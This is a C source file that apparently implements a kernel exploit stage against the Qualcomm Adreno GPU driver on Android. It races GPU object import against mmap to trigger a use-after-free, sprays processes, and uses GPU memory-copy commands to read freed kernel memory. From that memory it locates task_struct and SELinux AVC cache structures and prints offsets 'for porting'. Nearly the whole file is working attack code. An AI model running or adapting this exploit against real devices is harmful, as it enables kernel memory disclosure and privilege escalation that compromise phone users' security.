#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/sysmacros.h>
#include <sched.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_ADDR  0x7001ff000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_ADDR 0x7001fe000ULL
#define OVERLAP_SIZE 0x7000ULL
#define BOGUS_ADDR 0x700204000ULL
#define BOGUS_SIZE 0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

#define SPRAY_PIDS 2000
#define SCAN_DWORDS 560
#define AVC_PAGES_PER_IB 12
#define PRE_PAGES_PER_IB 4
#define CHURN_MAX_PATHS 20000

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static int uaf_id = -1, ph_id = -1;

static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0;
static int churn_built = 0;

static const char *churn_dirs[] = {
    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
    "/dev", "/proc",
};

static void die(const char *msg) { perror(msg); exit(1); }

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

static void phase1_rbtree(void) {
    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
    printf("[*] UAF setup: UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);
}

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp) == 0) {
            struct kgsl_gpuobj_free f = { .id = imp.id };
            ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
        }
        usleep(1);
    }
    return NULL;
}

static bool phase2_race(void) {
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 30000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) {
            munmap(r, OVERLAP_SIZE);
            hit = 1;
            break;
        }
        if (e == ENODEV) {
            hit = 1;
            break;
        }
        if (i % 1000000 == 0) printf("  race %d/30000000 errno=%d\n", i, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); return false; }
    printf("[+] Race won!\n");
    return true;
}

static void phase3_free_uaf(void) {
    gpuobj_free(uaf_id);
    printf("[+] UAF freed\n");
}

static void phase4_reclaim(void) {
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);
}

static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(void) {
    printf("[SPRAY] spawning...\n");
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (;;) usleep(200000);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    printf("[SPRAY] %d children\n", n_spray);
}

static void kill_spray_children(void) {
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (waitpid(-1, NULL, 0) > 0);
    printf("[KILL] spray children killed\n");
}

static void churn_walk(const char *dir, int depth) {
    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
        if (de->d_name[0] == '.') continue;
        char p[192];
        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
        int fd = open(p, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        churn_npaths++;
        churn_walk(p, depth + 1);
    }
    closedir(d);
}

static void churn_build(void) {
    if (churn_built) return;
    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
         churn_npaths < CHURN_MAX_PATHS; d++) {
        churn_walk(churn_dirs[d], 0);
    }
    churn_built = 1;
    printf("[CHURN] %d paths built\n", churn_npaths);
}

static void churn_round(void) {
    churn_build();
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
    }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) { close(s); }
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
}

static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                              uint64_t scan_start, uint64_t end_va,
                              uint64_t *out_vas, int maxout) {
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int n = 0, dw;
    unsigned int ts;
    uint64_t va = scan_start;
    while (va < end_va && n < maxout) {
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, PRE_PAGES_PER_IB * SCAN_DWORDS * 4);
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        int batch = 0;
        for (; batch < PRE_PAGES_PER_IB && va < end_va; batch++, va += 0x1000) {
            for (int w = 0; w < SCAN_DWORDS; w++) {
                uint32_t dl, dh, sl, sh;
                split64(dst_ga + (batch * SCAN_DWORDS + w) * 4, &dl, &dh);
                split64(va + w * 4, &sl, &sh);
                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                cmd[dw++] = sl; cmd[dw++] = sh;
            }
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();
        uint64_t pva = va - batch * 0x1000;
        for (int p = 0; p < batch; p++) {
            uint32_t *pd = &data[p * SCAN_DWORDS];
            int found = 0;
            for (int i = 0; i < SCAN_DWORDS - 1 && !found; i++)
                if (pd[i] == 0x4B534154 && pd[i+1] == 0x21464155) found = 1;
            if (found && n < maxout) {
                out_vas[n++] = pva + p * 0x1000;
                printf("[TASK] va=0x%lx\n", (unsigned long)(pva + p * 0x1000));
            }
        }
    }
    return n;
}

static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                             void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                             uint64_t *vas, int npages, int stride) {
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int idx = 0, total_nodes = 0;
    unsigned int ts;
    int nodes_per_page = 4096 / stride;
    if (nodes_per_page == 0) return 0;

    while (idx < npages) {
        int max_nodes_per_batch = (0x10000 - 256) / (4 * 6 * 4);
        if (max_nodes_per_batch < 1) max_nodes_per_batch = 1;
        int max_pages = max_nodes_per_batch / nodes_per_page;
        if (max_pages < 1) max_pages = 1;
        int batch = npages - idx;
        if (batch > max_pages) batch = max_pages;

        int node_dws = batch * nodes_per_page * 4;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, node_dws * 4);
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int p = 0; p < batch; p++) {
            uint64_t va = vas[idx + p];
            for (int n = 0; n < nodes_per_page; n++) {
                uint64_t node_va = va + n * stride;
                uint32_t dofs = (p * nodes_per_page + n) * 4;
                for (int w = 0; w < 4; w++) {
                    uint32_t dl, dh, sl, sh;
                    split64(dst_ga + (dofs + w) * 4, &dl, &dh);
                    split64(node_va + w * 4, &sl, &sh);
                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                    cmd[dw++] = sl; cmd[dw++] = sh;
                }
            }
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        if (dw * 4 > 0x10000) {
            printf("[-] Command buffer overflow! dw=%d\n", dw);
            return total_nodes;
        }
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) {
            printf("[-] submit_ib failed\n");
            break;
        }
        if (wait_timestamp(ctx_id, ts) < 0) {
            printf("[-] wait_timestamp failed\n");
            break;
        }
        __sync_synchronize();

        for (int p = 0; p < batch; p++) {
            uint64_t va = vas[idx + p];
            for (int n = 0; n < nodes_per_page; n++) {
                uint32_t *nd = &data[(p * nodes_per_page + n) * 4];
                uint32_t ssid = nd[0], tsid = nd[1], tclass = nd[2], allowed = nd[3];
                if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
                    total_nodes++;
                    printf("[AVC_NODE] stride=%d va=0x%lx+0x%x ssid=%u tsid=%u tclass=%u allowed=0x%x\n",
                        stride, (unsigned long)va, n*stride, ssid, tsid, tclass, allowed);
                }
            }
        }
        idx += batch;
    }
    return total_nodes;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] KGSL UAF Analyzer\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    printf("[*] Phase 1: rbtree setup\n");
    phase1_rbtree();

    printf("[*] Phase 2: race\n");
    if (!phase2_race()) { close(kgsl_fd); return 1; }

    printf("[*] Phase 3: free UAF\n");
    phase3_free_uaf();

    printf("[*] Phase 4: reclaim\n");
    phase4_reclaim();

    spawn_spray();
    usleep(200000);

    unsigned int ctx_id = create_context();
    printf("[GPU] context=%u\n", ctx_id);

    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);

    int dst_id = gpuobj_alloc(0x10000, alloc_flags);
    void *dst_m = gpuobj_mmap(0x10000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);

    printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);

    uint64_t task_pgs[4096];
    int n_task = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
        UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
    printf("[TASK] Found %d task_struct pages\n", n_task);

    if (n_task > 0) {
        uint32_t *data = (uint32_t *)dst_m;
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        int dw = 0;
        uint32_t *cmd = (uint32_t *)ib_m;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i*4, &dl, &dh);
            split64(task_pgs[0] + i*4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
            wait_timestamp(ctx_id, ts);
            __sync_synchronize();
            int comm_off = -1;
            for (int i = 0; i < SCAN_DWORDS - 2; i++) {
                if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
                    comm_off = i * 4;
                    break;
                }
            }
            if (comm_off != -1)
                printf("[TASK] comm offset = 0x%x\n", comm_off);
            else
                printf("[TASK] comm string not found\n");
        }
    }

    kill_spray_children();
    usleep(100000);

    printf("[*] Running heavy churn to populate AVC cache (20 rounds)\n");
    churn_build();
    for (int c = 0; c < 20; c++) {
        churn_round();
        if ((c+1) % 5 == 0) printf("[CHURN] round %d done\n", c+1);
    }

    int strides[] = {
        16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60,
        64, 68, 72, 76, 80, 84, 88, 92, 96, 100, 104, 108,
        112, 116, 120, 124, 128
    };
    int num_strides = sizeof(strides)/sizeof(strides[0]);
    int found = 0;
    int best_stride = 0;
    printf("[AVC] Starting scan (brute-force stride, %d values)\n", num_strides);
    for (int si = 0; si < num_strides; si++) {
        int s = strides[si];
        printf("[AVC] Scanning with stride=%d...\n", s);
        int n = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
                                  task_pgs, n_task, s);
        if (n > 0) {
            found = 1;
            best_stride = s;
            printf("[AVC] Found %d AVC nodes with stride=%d\n", n, s);
            break;
        }
    }

    if (!found) {
        printf("[AVC] Not found in task pages, rescanning entire range\n");
        uint64_t all_vas[4096];
        int n_all = 0;
        for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
            if (n_all < 4096) all_vas[n_all++] = va;
        }
        for (int si = 0; si < num_strides; si++) {
            int s = strides[si];
            printf("[AVC] Scanning entire range with stride=%d...\n", s);
            int n = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
                                      all_vas, n_all, s);
            if (n > 0) {
                found = 1;
                best_stride = s;
                printf("[AVC] Found %d AVC nodes with stride=%d\n", n, s);
                break;
            }
        }
    }

    if (found) {
        printf("[+] Valid AVC nodes found. stride = %d\n", best_stride);
        printf("[+] Confirmed offsets: ssid=0x00, tsid=0x04, tclass=0x08, allowed=0x0c\n");
        printf("[+] Set AVC_NODE_STRIDE to %d for porting\n", best_stride);
    } else {
        printf("[-] No AVC nodes found with any stride.\n");
        printf("[-] Churn may be insufficient or AVC cache empty.\n");
        printf("[-] Manually check /sys/fs/selinux/avc/hash_stats for entries.\n");
    }

    kill_spray_children();
    close(kgsl_fd);
    printf("[*] Analysis complete.\n");
    return 0;
}
